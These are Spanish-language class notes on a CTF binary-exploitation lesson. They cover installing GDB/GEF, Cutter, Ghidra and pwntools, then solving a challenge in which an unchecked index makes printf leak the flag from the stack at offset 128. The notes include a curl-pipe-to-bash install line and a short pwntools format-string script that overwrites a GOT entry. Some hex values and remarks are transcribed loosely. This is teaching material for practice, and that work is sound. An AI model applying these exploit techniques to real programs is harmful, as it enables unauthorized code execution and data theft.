# Clase 8 - SetUpTools

#CTF #PWN #ReverseEngineering #GDB #Ghidra #Cutter #BinaryExploitation #fish #GEF #pwntools #fgets #scanf #atoi #checksec #disassembly #debugging 

---

## Inicio del Reto

Entramos a:

- https://ctf.tjctf.org/challs
- https://tjctf.org/

Al parecer no funcionan, pero bueno.

---

## Proceso de Resolución del Reto

Al parecer veremos resolver un reto al Master Elías. Documentaré todo lo que hace:

### Preparación del Entorno

Crea su ambiente de trabajo naturalmente: descarga y mueve el reto a una estructura de carpetas limpia enfocada en esta categoría.

Hace ejecutable al binario y lo ejecuta para ver qué hace.

**El reto imprime esto:** `Cannot find flag.txt`

Lo que sugiere que el reto necesita ese archivo para funcionar.

---

## Configuración del Shell: Fish

Para descargar el intérprete de comandos que le gusta a Elías:

```bash
sudo apt install fish
```

Ejecutar fish:

```bash
fish
```

### Para hacerlo predeterminado, este es el proceso:

```bash
which fish
```

Esto nos dará la ruta, por ejemplo: `<Ruta/a/fish>`

Luego:

```bash
chsh
```

Pedirá contraseña y después la ruta del intérprete que queremos. La ponemos y listo.

---

## Configuración de GDB con GEF

Para poner un buen plugin a GDB existe uno llamado **GEF**:

- https://github.com/hugsy/gef

Se instala con este comando:

```bash
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```
*fish interpreta diferente el $
### Instalación de Binutils

Si se ocupa el `readelf`, ese está en este paquete:

```bash
sudo apt install binutils
```

---

## Configuración Permanente de GDB

Para que los pasos en GDB sean sin saltos alocados, activamos esto:

```gdb
set step-mode on
```

Para ponerlo permanente debemos editar el `.gdbinit` que está en nuestro home y ponemos el comando que hicimos ahorita en ese archivo y guardamos:

```bash
set step-mode on
```

### Sintaxis de Intel en GDB

Para poner la sintaxis de Intel en GDB podemos ponerla de esta manera:

```gdb
set disassembly-flavor intel
```

---

## Análisis del Binario

Bueno, ya está el GDB. Los CTF solo nos dan el ejecutable; sería raro que nos den el código fuente. Bueno, este sería el proceso:

### Proceso de Análisis

1. Meterte a GDB con el binario
2. Sacar información de las funciones que tiene con esto:

```gdb
info functions
```

### Output del Binario del Reto

En el caso del binario del reto da esto:

```gdb
gef> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401050  fclose@plt
0x0000000000401060  __stack_chk_fail@plt
0x0000000000401070  setbuf@plt
0x0000000000401080  printf@plt
0x0000000000401090  fgets@plt
0x00000000004010a0  fopen@plt
0x00000000004010b0  __isoc99_scanf@plt
0x00000000004010c0  atoi@plt
0x00000000004010d0  __libc_start_main@plt <-- De aquí para arriba son funciones de la librería de C (@plt)
0x00000000004010e0  _start <-- De aquí
0x0000000000401110  deregister_tm_clones
0x0000000000401140  register_tm_clones
0x0000000000401180  __do_global_dtors_aux
0x00000000004011b0  frame_dummy <-- Acá son cosas que usa el compilador, las veremos "siempre"
0x00000000004011b9  main <-- Esta es la única función que tiene
```

Entonces deberíamos analizar el ensamblador de `main` con:

```gdb
disassemble main
```

Esto nos dará:

```
[... ..  ...  .. .....]
[... Ensamblador .....]
[... ..  ...  .. .....]
```

---

## Herramientas de Decompilación

Elías recomienda que cuando ya estemos más avanzaditos sí veamos el ensamblador así directo, pero por mientras está bien usar un decompilador. Él muestra 2:

---

### 1. Cutter

- https://cutter.re/

#### Instalación de Cutter

Solo descargamos, luego le damos permisos:

```bash
chmod +x "cutter"
```

Luego lo movemos al path para ejecutar sencillamente:

```bash
sudo mv cutter /usr/local/bin/cutter
```

Y ya solo damos:

```bash
cutter
```

#### Dependencias

Si pide FUSE, solo lo instalamos:

```bash
sudo apt install fuse
```

#### Uso de Cutter

Bueno, ya abierto cargamos el binario y nos da información de este y nos muestra las funciones a la izquierda.

Presionamos `main` y nos desglosa el ensamblador y pues tiene una pestaña de grafo (barra acostada inferior) que parece un diagrama de flujo.

**Nota:** La función `jmp` (jump/salto) es un `if` en código.

Luego tenemos otra pestaña: **el decompilador**, que ese ya interpreta el ensamblador como código de lenguaje. Por defecto usa el `jsdec` que está feo, pero podemos cambiar por el **Ghidra** y ese sí pone las instrucciones como lenguaje C.

---

### 2. Ghidra

- https://github.com/NationalSecurityAgency/ghidra/releases

#### Instalación de Ghidra

Descargamos el zip, lo movemos a una carpeta acá buena, luego lo descomprimimos.

Ghidra está hecho en Java, así que tenemos que tener Java:

```bash
sudo apt search openjdk
sudo apt install openjdk-17-jdk
```

Y ahora sí, en la carpeta descomprimida:

```bash
./ghidrarun
```

#### Uso de Ghidra

Hacemos un nuevo proyecto e importamos el binario del reto.

El objetivo es irnos a nuestro `main` y ver el código ensamblador, etc. Es muy recomendable cambiar los nombres de las variables para entender mejor eso.

---

## Análisis del Código Decompilado

Por mientras, este es el bloque de empiezo:

```c
if (flag_fd == (FILE *)0x0) {
    printf("Cannot find flag.txt.");
    result = 1;
}
else {
    fgets((char *)&local_38,0x19,flag_fd); <-- ¿Qué hace fgets? -1-
    fclose(flag_fd);
    printf("Input: ");
    __isoc99_scanf(&DAT_0010202d,&local_b8); <-- Recordemos el printf -2-
    uVar1 = atoi((char *)&local_b8); <-- ¿Qué es atoi? -3-
    if ((int)uVar1 < 0x81) { <-- ¿Qué hace esa condición? -4-
        printf("%s",(long)&local_b8 + (long)(int)(uVar1 & 0xff));
        result = 0;
    }
    else {
        result = 0;
    } 
}
```

### Metodología de Investigación

Si nos topamos con una función que no sabemos qué hace, la buscamos en Google tipo:

```
<función> c function
```

Ver qué hace, cómo funciona, sus argumentos y qué está agarrando en el binario objetivo es la norma.

---

### -1- Función `fgets`

Por ejemplo, tocó investigar la función `fgets` y en la página dice esto:

> The C library function `char *fgets(char *str, int n, FILE *stream)` reads a line from the specified stream and stores it into the string pointed to by str. It stops when either (n-1) characters are read, the newline character is read, or the end-of-file is reached, whichever comes first.

El `stream` es lo que lee. Dice que está leyendo algo del archivo de la flag en este caso y dice que lo guarda en el string que es el primer argumento, entonces lo guarda en `local_38`. Así que guarda el contenido de la flag, entonces podemos renombrarlo por `flag`.

---

### -2- Función `scanf`

El `scanf`, igual que el `printf`, utiliza formato. Entonces eso raro que sale allí `"DAT_0010202d"` es un formato y el otro argumento es nuestro input. Si damos doble clic en ese `DAT_0010202d` dice `%15s`, entonces lee 15 caracteres de nuestro input.

---

### -3- Función `atoi`

Buscamos:

```
atoi c function
```

Dice que convierte un string en un número entero.

Es decir, que nuestro input debe ser un número entero. `uVar1` cambiado a `num_input`.

---

### -4- Análisis de la Condición

Si `num_input` es menor a `0x81` (que es hexadecimal; con clic derecho sobre él lo podemos cambiar a decimal = 129), nos imprime un string que está en la dirección de nuestro input/donde tenemos guardado nuestro input, y a esa dirección le suma el número que le pasamos `num_input`.

**Entonces el reto se trata de pasarle la dirección de la flag, porque la flag ya está en el programa, ya la leyó; solo hay que hacer que la imprima.**

---

## Instalación de Pwntools

Se ocupa pip, entonces:

```bash
sudo apt install python3-pip
pip install pwntools
```

### Configuración de PATH en Fish

Fish permite agregar carpetas al path de manera muy sencilla de esta manera:

```bash
fish_add_path .local/bin/
```

Y ya.

---

## Análisis del Input Inicializado

Podemos ver que nuestro input ya está inicializado con un valor extraño al principio que, con el formato a simple vista, se ve que es un string:

```c
input = 0x20676e696874674e; <-- Huele a string 
local_b0 = 0x6820656573206774;
local_a8 = 0x4e202e2e2e657265;
local_a0 = 0x7420676e6968746f;
```

### Conversión de Hexadecimal a String

```bash
unhex 20676e696874674e
gnihtoN
```

Que al revés es `nothing` (little endian).

Y pues si traducimos lo demás dice `nothing to see here...`

---

## Pruebas de Ejecución

Si lo ejecutamos con números:

- **Con 0:** imprime `0` (le sumamos a la dirección un nullbyte básicamente)
- **Con 1:** nada, porque:

```
0x20676e6968746f[4e] <-- Entre corchetes sería el 0 y lo que sigue [6f] quedaría como un nullbyte 00
```

Siguiendo con el **2**, imprime lo que iría enfrente del nullbyte que se generó arriba, es decir, abarcaría algo como esto:

```
input = 0x20676e696874
local_b0 = 0x6820065573206774 <-- Hasta que se tope un 00
```

En GDB podemos ver ese valor.

Si vemos, irá imprimiendo lo que está de estos valores y en determinado momento imprimirá `flag`:
(código decompilado del reto)
```c
input = 0x20676e6968746f4e;		    .
local_b0 = 0x6820656573206774;		.
local_a8 = 0x4e200e2e2e657265;		.
local_a0 = 0x7420676e69687467;		.
local_98 = 0x6568206565732067; 		.
local_90 = 0x2e2e2e6572;		    .
local_88 = 0;				        .
local_80 = 0;				        .
local_78 = 0;				        .
local_70 = 0;				        .
local_68 = 0;				        .
local_60 = 0;				        .
local_58 = 0;				        .
local_50 = 0;				        .
local_48 = 0;				        .
local_40 = 0;				        .
flag = 0;			               -n-
local_30 = 0;				
uStack_27 = 0;				
uStack_28 = 0;
local_27 = 0;
flag_fd = fopen("flag.txt","r");
```

---

## Debugging con GDB

Es momento de ver con GDB.

Lo abrimos y vemos `main`:

```gdb
disassemble main
```

Buscamos a la función `fgets`, la cual se le pasa la flag como argumento.

Bueno, Elías vio que chance no sirve de mucho porque está acomodado extrañamente, así que decidió debuggear un punto encima del `printf` (`main+118`).

Luego hace un:

```gdb
dereference $rsp --length 50
```

Para ver mejor todo en ese registro:

```
0x00007fffffffdec0 +0x0000: 0x0000000101000002 ←$rsp
0x00007fffffffdec8 +0x0008: 0x00005555555592a0 → 0x0000000555555559
0x00007fffffffded0 +0x0010: 0x20676669687400[31] ("1") ←$rdx -1- cada par es 1 son 7 pares por eso le sumamos ese resto
0x00007fffffffded8 +0x0018: "to see here... Nothing to see here..." -2-
0x00007fffffffdee0 +0x0020: "ere... Nothing to see here..." -3-
0x00007fffffffdee8 +0x0028: "othing to see here..." -4-
0x00007fffffffdef0 +0x0030: "o see here..." -5-
0x00007fffffffdef8 +0x0038: 0x000000222226572 ("re..."?) -6- 
0x00007fffffffdf00 +0x0040: 0x0000000000000000 -7-
0x00007fffffffdf08 +0x0048: 0x0000000000000000 -8-
0x00007fffffffdf10 +0x0050: 0x0000000000000000 -9-
0x00007fffffffdf18 +0x0058: 0x0000000000000000 -10-
0x00007fffffffdf20 +0x0060: 0x0000000000000000 -11-
0x00007fffffffdf28 +0x0068: 0x0000000000000000 -12-
0x00007fffffffdf30 +0x0070: 0x0000000000000000 -13-
0x00007fffffffdf38 +0x0078: 0x0000000000000000 -14-
0x00007fffffffdf40 +0x0080: 0x[00]00000000000000 -15- <-- Nos imprimiría [eso] sin el +1
0x00007fffffffdf50 +0x0090: "flag{flag_falsa}\n"
0x00007fffffffdf58 +0x0098: "g falsa}\n"
```

---

## Cálculo del Offset

Entonces para leer la flag debemos leer **15 líneas de 8 bytes**: `15 x 8 = 120`

Le sumamos `+7` de los pares restantes de arriba `+1` para que no nos imprima un `0`: `120 + 7 + 1 = 128`

Entonces, como dice el análisis que hicimos al código antes, dice que `< 129` (menor a 129), entonces **128 sí cabe**.

---

## Resolución del Reto

Entonces ejecutamos el binario y de entrada damos **128**.

Entonces nos imprime la flag falsa que colocamos en local. Ahora pues nos conectaríamos al reto real y daríamos para ver la flag.

**Entonces se dice: así son los retos de PWN, primero los resuelves en tu computadora, luego ya sí te conectas al servidor.**

---

## Debuggear en gdb

Podemos emplear esto para debuggear en **gdb**.

```
from pwn import *
from time import sleep

context.arch = 'amd64'
context.terminal = 'st' <-- Para debugear especificamos la terminal en el caso de Elías st

vuln = ELF("./vuln")

payload = fmtstr_payload(6, {vuln.got["puts"]: vuln.symbols["win"]})

p = process("./vuln") <-- Abrimos proceso de el binario

gdb.attach(p) <-- Y aca abrimos el gdb para debugear en si
sleep(2)

p.sendline(payload)
p.interactive()
```

---
## Nota Final sobre Protecciones

`NX enabled` en `checksec <binario>` = no podremos ejecutar shellcodes a menos de que el reto use `nmap` (no se si dijo nmap lo dudo xdd) para reservar memoria ejecutable. creo que dijo 